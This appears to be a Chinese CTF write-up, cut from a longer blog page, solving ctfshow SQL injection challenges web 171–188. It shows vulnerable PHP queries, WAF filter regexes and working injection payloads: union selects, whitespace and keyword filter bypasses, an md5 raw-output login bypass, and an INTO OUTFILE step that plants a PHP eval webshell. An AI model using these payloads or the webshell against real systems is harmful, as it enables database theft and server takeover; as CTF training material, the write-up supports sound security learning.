'1a';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '1';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '0';</code></p>\n<p>返回结果是 0</p>\n<p>那么也就是说，在 or 语句中，0，字母开头的为非，数字开头的为正</p>\n<p>可利用该特性进行 SQL 注入</p>\n</li>\n<li>\n<p>sql 语句的查询机制</p>\n</li>\n<li>\n<p>如 sql 语句 <code>select username,password from users where username='flag';</code></p>\n<p>它将会返回 <code>username</code>  为 <code>flag</code>  的值的数据</p>\n<p>但如果此时将 <code>username='flag'</code>  换为 <code>username=0</code>  后，是否还能查到 flag 呢？</p>\n<p>答案是肯定的，这是因为，这里的等于是弱等于，</p>\n</li>\n<li>\n<p>substr 如果被禁了，可以使用 left 代替，其中 left 只有两个参数，第一个为字符串，第二个为个数，即从最左端开始</p>\n<p>如 <code>select left(\"abc\",2);</code>  返回 <code>ab</code></p>\n<p>或者也可以使用 <code>lpad</code> ，其有三个参数</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>LPAD<span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span>len<span class=\"token punctuation\">,</span>padstr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">Returns</span> the string str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">left</span><span class=\"token operator\">-</span>padded <span class=\"token keyword\">with</span> the string padstr <span class=\"token keyword\">to</span> a length <span class=\"token keyword\">of</span> len characters<span class=\"token punctuation\">.</span> <span class=\"token keyword\">If</span> str <span class=\"token operator\">is</span> longer than len<span class=\"token punctuation\">,</span> the <span class=\"token keyword\">return</span> <span class=\"token keyword\">value</span> <span class=\"token operator\">is</span> shortened <span class=\"token keyword\">to</span> len characters<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mysql<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'??hi'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mysql<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'h'</span></pre></td></tr></tbody></table></figure><p>那么可以 <code>lpad(\"abc\",2,\"\");</code>  达到与 left 同样效果</p>\n</li>\n<li>\n<p>时间盲注</p>\n<p><strong>sleep(3)</strong> 直截了当的时间盲注</p>\n<p><strong>benchmark()</strong></p>\n<p>The BENCHMARK() function executes the expression expr repeatedly count times. It may be used to time how quickly MySQL processes the expression. The result value is 0, or NULL for inappropriate arguments such as a NULL or negative repeat count.</p>\n<p><strong>rlike</strong> 正则匹配</p>\n<p><strong>多次查询排序</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">&gt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>c<span class=\"token punctuation\">)</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure></li>\n</ul>\n<h1 id=\"web-171\"><a class=\"anchor\" href=\"#web-171\">#</a> web 171</h1>\n<p>根据查询语句</p>\n<p><code>$sql = \"select username,password from user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\";</code>  可知可用单引号闭合，然后利用 or 的特性</p>\n<p><code>0' or username='flag'%23</code></p>\n<p>查找到 flag</p>\n<h1 id=\"web-172\"><a class=\"anchor\" href=\"#web-172\">#</a> web 172</h1>\n<p>使用联合注入</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p><code>' union select 1,password from ctfshow_user2 where username ='flag'%23</code></p>\n<h1 id=\"web-173\"><a class=\"anchor\" href=\"#web-173\">#</a> web 173</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>同上题</p>\n<p><code>' union select 1,2,password from ctfshow_user3 where username ='flag'%23</code></p>\n<h1 id=\"web-174\"><a class=\"anchor\" href=\"#web-174\">#</a> web 174</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>这题使用 <code>replace</code>  函数对数字进行替换</p>\n<p>注意需要抓包，因为内容过长，正常提交不上去，同时 url 编码</p>\n<p><code>'%20union%20select%20'a'%2Creplace(replace(replace(replace(replace(replace(replace(replace(replace(replace((b.password)%2C'0'%2C'!')%2C'1'%2C'%23')%2C'2'%2C'%24')%2C'3'%2C'%25')%2C'4'%2C'%26')%2C'5'%2C'(')%2C'6'%2C')')%2C'7'%2C'*')%2C'8'%2C'%2B')%2C'9'%2C'%2C')%20from%20ctfshow_user4%20as%20b%20where%20b.username%3D'flag'%23</code></p>\n<h1 id=\"web-175\"><a class=\"anchor\" href=\"#web-175\">#</a> web 175</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[\\x00-\\x7f]/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>过滤了所有 ASCII 字符</p>\n<p>写文件</p>\n<p><code>'%20union%20select%201%2C%22%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%22%20into%20outfile%20%22%2Fvar%2Fwww%2Fhtml%2F1.php%22%23</code></p>\n<p>然后蚁剑连接，进入数据库，查询 flag  <code>select password from ctfshow_user5 where username='flag';</code></p>\n<h1 id=\"web-176\"><a class=\"anchor\" href=\"#web-176\">#</a> web 176</h1>\n<p><code>0' or username='flag'%23</code></p>\n<h1 id=\"web-177\"><a class=\"anchor\" href=\"#web-177\">#</a> web 177</h1>\n<p>过滤了空格</p>\n<p><code>0'/**/or/**/username='flag'%23</code></p>\n<h1 id=\"web-178\"><a class=\"anchor\" href=\"#web-178\">#</a> web 178</h1>\n<p>前面的空格绕过用不了，这里使用 <code>%0a</code>  和括号绕过</p>\n<p><code>0'union%0aselect'1','2',(select(password)from(ctfshow_user)where(username='flag'))%23</code></p>\n<p>或者仅仅用括号</p>\n<p><code>0'or(username='flag')%23</code></p>\n<h1 id=\"web-179\"><a class=\"anchor\" href=\"#web-179\">#</a> web 179</h1>\n<p>同上一题做法</p>\n<h1 id=\"web-180\"><a class=\"anchor\" href=\"#web-180\">#</a> web 180</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select id,username,password from ctfshow_user where username !='flag' and id = '\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"' limit 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"解法一\"><a class=\"anchor\" href=\"#解法一\">#</a> 解法一</h2>\n<p><code>0'union%0cselect'1','2',(select(password)from(ctfshow_user)where(username='flag'))'</code></p>\n<p>由于过滤了 <code>--+</code>  和 <code>#</code> ，只能使用闭合</p>\n<h2 id=\"解法二\"><a class=\"anchor\" href=\"#解法二\">#</a> 解法二</h2>\n<p><code>0'or(username='flag')and'2</code></p>\n<p>原理是运用了 sql 语句的判断优先级，与原查询语句组合后，得到 <code>select id,username,password from ctfshow_user where username !='flag' and id = 0'or(username='flag')and'2' limit 1;</code></p>\n<p><code>username!='flag' and id=0</code>  和 <code>username='flag' and '2'</code>  作为两个条件进行判断，因此可以返回结果</p>\n<h1 id=\"web-181\"><a class=\"anchor\" href=\"#web-181\">#</a> web 181</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>用上一题的解法二即可</p>\n<h1 id=\"web-182\"><a class=\"anchor\" href=\"#web-182\">#</a> web 182</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>过滤了 flag，前面的 <code>username='flag'</code>  用不了，这里可以使用正则 <code>0'or(username)regexp'f'and'2</code></p>\n<p>或者根据前面做题，知 flag 始终在 id 为 26 的地方，故可以使用 <code>id=26</code> , 即 <code>0'or(id=26)and'2</code></p>\n<h1 id=\"web-183\"><a class=\"anchor\" href=\"#web-183\">#</a> web 183</h1>\n<p>``</p>\n<h1 id=\"web-184\"><a class=\"anchor\" href=\"#web-184\">#</a> web 184</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 查询语句</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 返回逻辑</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 查询结果</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-185\"><a class=\"anchor\" href=\"#web-185\">#</a> web 185</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>可以看到，相比上题，这题多过滤了数字，如果要用之前的十六进制，分别需要获取数字 0-9 和字母 x，A,B,C,D,E,F</p>\n<p>对于数字，在 SQL 中可以利用以下来获取</p>\n<pre><code class=\"language-mysql\">true 1\nfalse 0\nselect true;   --&gt;    1\nselect false;   --&gt;    0\nslect true+true; --&gt;    2\n\n//同时也可以利用ceil，floor来获取如pi(),version()中的数据\nselect pi();    --&gt; 3.141593\nselect floor(pi());   --&gt; 3\nselect ceil(pi());    --&gt; 4\n</code></pre>\n<p>这里已经想到办法获得数字了，下面是字母的获取，这里可以使用 char</p>\n<pre><code class=\"language-mysql\">select char(97);  --&gt;  'a'\n</code></pre>\n<p>于是字母数字均获得，下面是两种思路</p>\n<ol>\n<li>利用 substr/left/right 函数，截取字符串，其截取位置和长度可由 <code>true</code>  来生成，然后使用前面一样的 regexp 进行匹配，其中一种是使用 concat 和 char 连接字符串，一种是只截取一位然后一位一位匹配</li>\n<li>利用 UNHEX 和 concat 函数，其中 concat 用来连接字母数字成十六进制字符串，UNHEX 用来对十六进制进行解码</li>\n</ol>\n<p>下面针对第一个编写脚本</p>\n<pre><code class=\"language-python\"></code></pre>\n<h1 id=\"web-186\"><a class=\"anchor\" href=\"#web-186\">#</a> web 186</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\&lt;|\\&gt;|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>相比之前过滤了 <code>%&lt;&gt;^</code> ，无影响，继续使用上题脚本</p>\n<h1 id=\"web-187\"><a class=\"anchor\" href=\"#web-187\">#</a> web 187</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from ctfshow_user where username = '<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>' and password= '<span class=\"token interpolation\"><span class=\"token variable\">$password</span></span>'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 只有 admin 可以获得 flag</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名不存在'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>经典 md5，输入用户名 <code>admin</code> ，密码 <code>ffifdyop</code></p>\n<p>md5('ffifdyop')=276f722736c95d99e921722cf9ed621c</p>\n<p>将其作为十六进制再解码后，可以得到 <code>'or' 6xxxx</code></p>\n<h1 id=\"web-188\"><a class=\"anchor\" href=\"#web-188\">#</a> web 188</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select pass from ctfshow_user where username = <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">}</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 用户名检测</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\'|\\\"/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token 